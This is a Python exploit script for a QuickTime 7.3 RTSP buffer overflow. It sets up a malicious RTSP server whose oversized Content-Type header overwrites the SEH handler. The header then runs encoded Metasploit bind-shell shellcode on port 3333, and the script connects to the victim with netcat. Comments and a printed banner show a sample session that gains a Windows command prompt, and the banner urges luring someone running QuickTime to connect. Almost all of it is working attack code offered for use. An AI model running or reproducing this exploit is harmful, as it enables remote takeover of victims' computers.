#!/usr/bin/env python
#
# Quicktime 7.3 RTSP BufferOverflow Exploit
#
# Original DoS exploit by h07
# Rewritten by: ReL1K
# SEH Overwrite
#
# A ton of help from Muts from offensive-security.
# 
# root@sslinux1:/home/relik/Desktop# python quicktime.py 
# [+] Listening on [RTSP] 554
# [+] Connection accepted from: 10.211.55.5
# [+] Done, connect to 10.211.55.5 on port 3333
# root@sslinuxvm12:/home/relik/Desktop# nc 10.211.55.5 3333
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\Program Files\QuickTime>
from socket import *
import subprocess
import time
import os
import sys
#from bin.include import print_banner

header = (
'RTSP/1.0 200 OK\r\n'
'CSeq: 1\r\n'
'Date: 0x00 :P\r\n'
'Content-Base: rtsp://0.0.0.0/1.mp3/\r\n'
'Content-Type: %s\r\n' # <-- overflow
'Content-Length: %d\r\n'
'\r\n')

body = (
'v=0\r\n'
'o=- 16689332712 1 IN IP4 0.0.0.0\r\n'
's=MPEG-1 or 2 Audio, streamed by the PoC Exploit o.O\r\n'
'i=1.mp3\r\n'
't=0 0\r\n'
'a=tool:ciamciaramcia\r\n'
'a=type:broadcast\r\n'
'a=control:*\r\n'
'a=range:npt=0-213.077\r\n'
'a=x-qt-text-nam:MPEG-1 or 2 Audio, streamed by the PoC Exploit o.O\r\n'
'a=x-qt-text-inf:1.mp3\r\n'
'm=audio 0 RTP/AVP 14\r\n'
'c=IN IP4 0.0.0.0\r\n'
'a=control:track1\r\n'
)
buffer = "\x42" * 991
shortjmp ="\xeb\x30\x90\x90" # eb = short jmp 30 bytes
pop = "\x4e\x28\x86\x66" # pop ebx pop ecx retn
nopslide="\x90"*60
# win32_bind -  EXITFUNC=process LPORT=3333 Size=344 Encoder=ShikataGaNai http://metasploit.com
shellcode=("\xbb\xae\xef\x1f\x96\xda\xcc\x2b\xc9\xd9\x74\x24\xf4\x5a\xb1\x51"
"\x31\x5a\x12\x83\xc2\x04\x03\xf4\xe1\xfd\x63\xf4\x94\xea\xc1\xec"
"\x90\x12\x26\x13\x02\x66\xb5\xcf\xe7\xf3\x03\x33\x63\x7f\x89\x33"
"\x72\x6f\x1a\x8c\x6c\xe4\x42\x32\x8c\x11\x35\xb9\xba\x6e\xc7\x53"
"\xf3\xb0\x51\x07\x70\xf0\x16\x50\xb8\x3b\xdb\x5f\xf8\x57\x10\x64"
"\xa8\x83\xf1\xef\xb5\x47\x5e\x2b\x37\xb3\x07\xb8\x3b\x08\x43\xe1"
"\x5f\x8f\xb8\x1e\x4c\x04\xb7\x4c\xa8\x06\xa9\x4f\x81\xed\x4d\xc4"
"\xa1\x21\x05\x9a\x29\xc9\x69\x06\x9f\x46\xc9\x3e\x81\x30\x44\x70"
"\x33\x2d\x08\x73\x9d\xcb\xfa\xed\x4a\x27\xcf\x99\xfd\x34\x1d\x06"
"\x56\x44\xb1\xd0\x9d\x57\xce\x1b\x72\x57\xf9\x04\xfb\x42\x60\x3b"
"\x16\x84\x6f\x6e\x83\x97\x90\x40\x3b\x41\x67\x95\x11\x26\x87\x83"
"\x39\x9a\x24\x78\xed\x5f\x98\x3d\x42\x9f\xce\xa7\x0c\x52\xea\x41"
"\x9e\xe5\x15\x18\x48\x52\xcf\x52\x4e\xcd\x0f\x44\x3a\xe2\xbe\x3d"
"\x44\xd2\x29\x19\x17\xfd\x40\x36\x97\xd4\xc0\xed\x98\x09\x8e\xe8"
"\x2e\x2c\x06\xa5\x4f\xe6\xc9\x1d\xe4\x52\x15\x4d\x97\x35\x0e\x14"
"\x5e\xbc\x87\x19\x88\x6a\xd7\x35\x53\xff\x43\xd3\xf4\x9c\xe6\x92"
"\xe0\x09\xa9\xfd\xc3\x01\xc0\x1a\x79\xde\x5a\x06\x4f\x1e\xaf\x6c"
"\x4e\xdc\x7d\x8e\xed\xcd\xee\xe3\x88\x35\xba\x50\xc7\x2e\xce\x58"
"\xab\xb9\xd1\xd1\x88\x3a\xfb\x42\x46\x97\x55\x25\x39\x7d\x57\x94"
"\xe8\xd4\x06\xe9\xdb\xbf\x05\xcc\xd9\xf1\x05\x11\x37\x67\x55\x12"
"\x8f\x87\x79\x67\xa7\x8b\xf9\xb3\x2c\x8b\x28\x69\x52\xa3\xbd\xf3"
"\x74\xa6\x4d\x58\x7a\xf1\x4d\x8e")
# pad the rest of the buffer
padding="\x41"*5900
# format the header
header %= (buffer+shortjmp+pop+nopslide+shellcode+padding, len(body))
evil = header + body
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 554))
s.listen(1)
#print_banner()
print """
    Quicktime 7.3 RTSP BufferOverflow Exploit

    Original DoS exploit by h07
    Python rewrite: Muts
    Rewritten again by: ReL1K
    SEH Overwrite

    A ton of help from muts at offensive-security

    root@sslinux1:/home/relik/Desktop# python quicktime.py
    [+] Listening on [RTSP] 554
    [+] Connection accepted from: 10.211.55.5
    [+] Done, connect to 10.211.55.5 on port 3333
    root@sslinuxvm12:/home/relik/Desktop# nc 10.211.55.5 3333
    Microsoft Windows [Version 5.2.3790]
    (C) Copyright 1985-2003 Microsoft Corp.

    C:\Program Files\QuickTime>

    Simply have someone with Quicktime connect to you with RTSP

    <ctrl>-c to Cancel

"""
print "[+] Listening on [RTSP] 554"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(evil)
print ("[+] Done, connecting to %s on port 3333 in 10 seconds..." % (addr[0]))
time.sleep(10)
connect=subprocess.Popen("nc %s 3333" % (addr[0]), shell=True).wait()
c.close()
s.close()
